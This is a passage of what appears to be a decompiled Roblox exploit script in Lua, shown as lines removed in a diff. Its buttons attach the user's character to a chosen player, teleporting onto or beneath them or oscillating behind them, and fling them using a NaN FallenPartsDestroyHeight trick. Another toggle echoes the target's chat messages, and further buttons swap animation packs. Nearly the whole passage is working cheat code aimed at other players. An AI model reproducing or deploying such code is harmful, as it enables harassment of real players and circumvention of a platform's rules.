-                until vu265.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-                game.Workspace.CurrentCamera.CameraSubject = vu38.Character.Humanoid
-            end
-        end
-    end)
-    vu268.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu268)
-            vu266.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu269.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu267.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu273.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu274.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu275.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            if vu268.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                if game.PlaceId == 11379739543 then
-                    SendNotify("V R 7", "\239\191\189\216\167\216\176 \216\167\217\132\217\133\216\167\216\168 \217\133\216\173\217\133\217\138 \217\133\217\134 \217\135\216\176\217\135 \216\167\217\132\216\167\217\136\216\167\217\133\216\177", 3)
-                    vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    return
-                end
-                getgenv().oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-                SendNotify("System VR7", "\239\191\189\217\132\216\174\217\138\216\167\216\177 \216\176\216\167 \217\138\216\179\217\133\216\173\217\132\217\131 \216\167\217\134\217\131 \216\170\216\179\217\133\216\185 \216\167\217\132\216\180\216\174\216\181 \217\136\217\135\217\136 \217\138\216\179\217\133\216\185\217\131 \217\132\217\133\216\167 \216\170\216\170\217\131\217\132\217\133 \217\133\216\167\217\138\217\131", 3)
-                repeat
-                    task.wait()
-                    GetRoot(vu38).CFrame = vu37[vu41].Character.Head.CFrame * CFrame.new(0, - 20, 0) * CFrame.Angles(math.rad(180), 0, 0)
-                    game.Workspace.CurrentCamera.CameraSubject = vu37[vu41].Character.Humanoid
-                until vu268.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-                game.Workspace.CurrentCamera.CameraSubject = GetRoot(vu38).Parent.Humanoid
-                TeleportTO(getgenv().oldcf.X, getgenv().oldcf.Y, getgenv().oldcf.Z, "pos", "safe")
-                game.Players.LocalPlayer.Character.Humanoid:ChangeState("GettingUp")
-            end
-        end
-    end)
-    vu269.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu269)
-            if vu269.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                vu266.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu268.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu267.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu273.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu274.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu275.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                if game.PlaceId == 11379739543 then
-                    repeat
-                        pcall(function()
-                            local v677 = vu37[vu41].Character
-                            local v678 = v677 and GetRoot(vu38) and (v677:FindFirstChild("Torso") or v677:FindFirstChild("UpperTorso"))
-                            if v678 then
-                                local v679 = GetRoot(vu38)
-                                v679.Velocity = Vector3.new()
-                                local v680 = math.sin(tick() * 20) * 0.6
-                                v679.CFrame = v678.CFrame * CFrame.new(0, 0, 2 + v680)
-                            end
-                        end)
-                        workspace.FallenPartsDestroyHeight = 0 / 0
-                        task.wait()
-                    until vu269.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-                else
-                    repeat
-                        pcall(function()
-                            local v681 = vu37[vu41].Character:FindFirstChild("Torso") or vu37[vu41].Character:FindFirstChild("UpperTorso")
-                            if GetRoot(vu38).Parent.Humanoid.RigType.Name ~= "R15" or not GetRoot(vu38).Parent.Humanoid.Sit then
-                                if GetRoot(vu38).Parent.Humanoid.Sit and not CheckAnim("148840371") then
-                                    PlayAnim(148840371, 0, 3.7)
-                                end
-                            elseif not CheckAnim("5918726674") then
-                                PlayAnim(5918726674, 0, 2)
-                            end
-                            GetRoot(vu38).Parent.Humanoid.Sit = true
-                            GetRoot(vu38).CFrame = v681.CFrame * CFrame.new(0, 0, 1)
-                            GetRoot(vu38).Velocity = Vector3.new(0, 0, 0)
-                        end)
-                        workspace.FallenPartsDestroyHeight = 0 / 0
-                        task.wait()
-                    until vu269.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-                end
-                workspace.FallenPartsDestroyHeight = - 500
-                StopAnim()
-                GetRoot(vu38).Parent.Humanoid.Sit = false
-            end
-        end
-    end)
-    vu272.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu272)
-            if vu272.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                if game.PlaceId == 11379739543 then
-                    SendNotify("V R 7", "\239\191\189\216\167\216\176 \216\167\217\132\217\133\216\167\216\168 \217\133\216\173\217\133\217\138 \217\133\217\134 \217\135\216\176\217\135 \216\167\217\132\216\167\217\136\216\167\217\133\216\177", 3)
-                    vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    return
-                end
-                vu266.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu268.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu267.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu269.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu273.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu274.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu275.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                repeat
-                    pcall(function()
-                        local v682 = vu37[vu41].Character.Head
-                        vu38.Character.Humanoid.Sit = true
-                        GetRoot(vu38).CFrame = v682.CFrame * CFrame.new(0, 2, 0)
-                        GetRoot(vu38).Velocity = Vector3.new(0, 0, 0)
-                    end)
-                    task.wait()
-                until vu272.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-                GetRoot(vu38).Parent.Humanoid.Sit = false
-            end
-        end
-    end)
-    vu273.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu273)
-            vu266.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu268.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu269.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu267.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu274.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu275.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            if vu273.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                if game.PlaceId == 11379739543 then
-                    SendNotify("V R 7", "\239\191\189\216\167\216\176 \216\167\217\132\217\133\216\167\216\168 \217\133\216\173\217\133\217\138 \217\133\217\134 \217\135\216\176\217\135 \216\167\217\132\216\167\217\136\216\167\217\133\216\177", 3)
-                    vu273.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    return
-                end
-                local v683, v684, v685 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-                while true do
-                    local v686
-                    v685, v686 = v683(v684, v685)
-                    if v685 == nil then
-                        break
-                    end
-                    v686:Stop()
-                end
-                local vu687 = - 2
-                local vu688 = 0.3
-                repeat
-                    task.wait(0.01)
-                    pcall(function()
-                        GetRoot(vu38).Parent.Humanoid.Sit = true
-                        GetRoot(vu38).CFrame = vu37[vu41].Character.Head.CFrame * CFrame.new(0, 0.7, vu687) * CFrame.Angles(0, math.rad(180), 0)
-                        GetRoot(vu38).Velocity = Vector3.new(0, 0, 0)
-                        vu687 = vu687 + vu688
-                        if vu687 >= - 1 or vu687 <= - 2 then
-                            vu688 = - vu688
-                        end
-                    end)
-                until vu273.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-                GetRoot(vu38).Parent.Humanoid.Sit = false
-            end
-        end
-    end)
-    vu274.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu274)
-            vu266.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu268.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu267.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu269.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu273.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu275.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            if vu274.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                if game.PlaceId == 11379739543 then
-                    SendNotify("V R 7", "\239\191\189\216\167\216\176 \216\167\217\132\217\133\216\167\216\168 \217\133\216\173\217\133\217\138 \217\133\217\134 \217\135\216\176\217\135 \216\167\217\132\216\167\217\136\216\167\217\133\216\177", 3)
-                    vu274.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    return
-                end
-                repeat
-                    pcall(function()
-                        local v689 = GetRoot(vu37[vu41])
-                        vu38.Character.Humanoid.Sit = true
-                        GetRoot(vu38).CFrame = v689.CFrame * CFrame.new(0, 0, 1.2) * CFrame.Angles(0, - 3, 0)
-                        GetRoot(vu38).Velocity = Vector3.new(0, 0, 0)
-                    end)
-                    task.wait()
-                until vu274.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-                GetRoot(vu38).Parent.Humanoid.Sit = false
-            end
-        end
-    end)
-    vu275.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu275)
-            vu266.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu268.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu267.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu269.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu273.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu274.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            if vu275.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                if game.PlaceId == 11379739543 then
-                    SendNotify("V R 7", "\239\191\189\216\167\216\176 \216\167\217\132\217\133\216\167\216\168 \217\133\216\173\217\133\217\138 \217\133\217\134 \217\135\216\176\217\135 \216\167\217\132\216\167\217\136\216\167\217\133\216\177", 3)
-                    vu275.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    return
-                end
-                spawn(function()
-                    workspace.FallenPartsDestroyHeight = 0 / 0
-                    while vu275.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                        pcall(function()
-                            if game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
-                                if game.Players.LocalPlayer.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R6 then
-                                    if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-                                        PlayAnim(698251653, 0.6, 0.4, true)
-                                        task.wait(0.16)
-                                    end
-                                else
-                                    PlayAnim(72042024, 0.675, 1, true)
-                                    wait(0.4)
-                                end
-                            end
-                        end)
-                        task.wait()
-                    end
-                    StopAnim()
-                end)
-                repeat
-                    pcall(function()
-                        if game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
-                            local v690 = GetRoot(vu37[vu41])
-                            game.Players.LocalPlayer.Character.Humanoid:ChangeState("GettingUp")
-                            if not game.Players.LocalPlayer.Character.Humanoid.Sit then
-                                game.Players.LocalPlayer.Character.Humanoid.Sit = true
-                            end
-                            GetRoot(vu38).CFrame = v690.CFrame * CFrame.new(0, 1, - 3) * CFrame.Angles(0, math.pi, 0)
-                            GetRoot(vu38).Velocity = Vector3.new(0, 0, 0)
-                        end
-                    end)
-                    task.wait()
-                until vu275.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-                workspace.FallenPartsDestroyHeight = - 500
-                game.Players.LocalPlayer.Character.Humanoid.Sit = false
-            end
-        end
-    end)
-    vu270.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            ChangeToggleColor(vu270)
-            if vu270.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                if TalkRepeater then
-                    TalkRepeater:Disconnect()
-                end
-            else
-                TalkRepeater = game:GetService("TextChatService").MessageReceived:Connect(function(p691)
-                    if p691.TextSource and p691.TextSource.UserId == vu37[vu41].UserId then
-                        Send(p691.Text)
-                    end
-                end)
-            end
-        end
-    end)
-    v271.MouseButton1Click:Connect(function()
-        if vu41 ~= nil then
-            TeleportTO(0, 0, 0, vu37[vu41], nil)
-        end
-    end)
-    vu263.FocusLost:Connect(function()
-        local v692 = vu138(vu263.Text)
-        UpdateTarget(v692)
-    end)
-    v300.MouseButton1Click:Connect(function()
-        vu278.Visible = false
-        vu277.Visible = false
-        vu276.Visible = true
-    end)
-    v299.MouseButton1Click:Connect(function()
-        vu278.Visible = false
-        vu276.Visible = false
-        vu277.Visible = true
-    end)
-    v279.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v693 = vu38.Character.Animate
-            v693.Disabled = true
-            StopAnim()
-            v693.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
-            v693.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
-            v693.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
-            v693.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
-            v693.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
-            v693.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
-            v693.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
-            vu38.Character.Humanoid:ChangeState(3)
-            v693.Disabled = false
-        else
-            SendNotify("System VR7", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v281.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v694 = vu38.Character.Animate
-            v694.Disabled = true
-            StopAnim()
-            v694.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
-            v694.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
-            v694.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
-            v694.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
-            v694.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
-            v694.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
-            v694.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
-            vu38.Character.Humanoid:ChangeState(3)
-            v694.Disabled = false
-        else
-            SendNotify("System VR7", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v280.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v695 = vu38.Character.Animate
-            v695.Disabled = true
-            StopAnim()
-            v695.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
-            v695.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
-            v695.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
-            v695.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
-            v695.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
-            v695.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
-            v695.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
-            vu38.Character.Humanoid:ChangeState(3)
-            v695.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v282.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v696 = vu38.Character.Animate
-            v696.Disabled = true
-            StopAnim()
-            v696.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
-            v696.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
-            v696.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
-            v696.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
-            v696.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
-            v696.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
-            v696.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
-            vu38.Character.Humanoid:ChangeState(3)
-            v696.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v283.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v697 = vu38.Character.Animate
-            v697.Disabled = true
-            StopAnim()
-            v697.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
-            v697.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
-            v697.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
-            v697.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
-            v697.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
-            v697.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
-            v697.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
-            vu38.Character.Humanoid:ChangeState(3)
-            v697.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v284.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v698 = vu38.Character.Animate
-            v698.Disabled = true
-            StopAnim()
-            v698.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
-            v698.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
-            v698.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
-            v698.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
-            v698.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
-            v698.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
-            v698.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
-            vu38.Character.Humanoid:ChangeState(3)
-            v698.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v285.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v699 = vu38.Character.Animate
-            v699.Disabled = true
-            StopAnim()
-            v699.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
-            v699.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
-            v699.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
-            v699.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
-            v699.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
-            v699.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
-            v699.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
-            vu38.Character.Humanoid:ChangeState(3)
-            v699.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v298.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v700 = vu38.Character.Animate
-            v700.Disabled = true
-            StopAnim()
-            v700.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
-            v700.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
-            v700.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
-            v700.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
-            v700.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
-            v700.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
-            v700.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
-            vu38.Character.Humanoid:ChangeState(3)
-            v700.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v297.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v701 = vu38.Character.Animate
-            v701.Disabled = true
-            StopAnim()
-            v701.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
-            v701.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
-            v701.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
-            v701.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
-            v701.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
-            v701.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
-            v701.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
-            v701.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
-            vu38.Character.Humanoid:ChangeState(3)
-            v701.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v286.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v702 = vu38.Character.Animate
-            v702.Disabled = true
-            StopAnim()
-            v702.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
-            v702.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
-            v702.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
-            v702.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
-            v702.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
-            v702.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
-            v702.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
-            vu38.Character.Humanoid:ChangeState(3)
-            v702.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v287.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v703 = vu38.Character.Animate
-            v703.Disabled = true
-            StopAnim()
-            v703.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
-            v703.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
-            v703.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
-            v703.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
-            v703.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
-            v703.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
-            v703.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
-            vu38.Character.Humanoid:ChangeState(3)
-            v703.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v288.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v704 = vu38.Character.Animate
-            v704.Disabled = true
-            StopAnim()
-            v704.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
-            v704.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
-            v704.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
-            v704.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
-            v704.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
-            v704.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
-            v704.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
-            vu38.Character.Humanoid:ChangeState(3)
-            v704.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v289.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v705 = vu38.Character.Animate
-            v705.Disabled = true
-            StopAnim()
-            v705.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
-            v705.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
-            v705.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
-            v705.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
-            v705.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
-            v705.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
-            v705.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
-            vu38.Character.Humanoid:ChangeState(3)
-            v705.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v290.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v706 = vu38.Character.Animate
-            v706.Disabled = true
-            StopAnim()
-            v706.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
-            v706.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
-            v706.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
-            v706.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
-            v706.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
-            v706.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
-            v706.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
-            vu38.Character.Humanoid:ChangeState(3)
-            v706.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v291.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v707 = vu38.Character.Animate
-            v707.Disabled = true
-            StopAnim()
-            v707.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
-            v707.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
-            v707.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
-            v707.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
-            v707.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
-            v707.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
-            v707.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
-            vu38.Character.Humanoid:ChangeState(3)
-            v707.Disabled = false
-        else
-            SendNotify("System TRX511", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v292.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v708 = vu38.Character.Animate
-            v708.Disabled = true
-            StopAnim()
-            v708.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
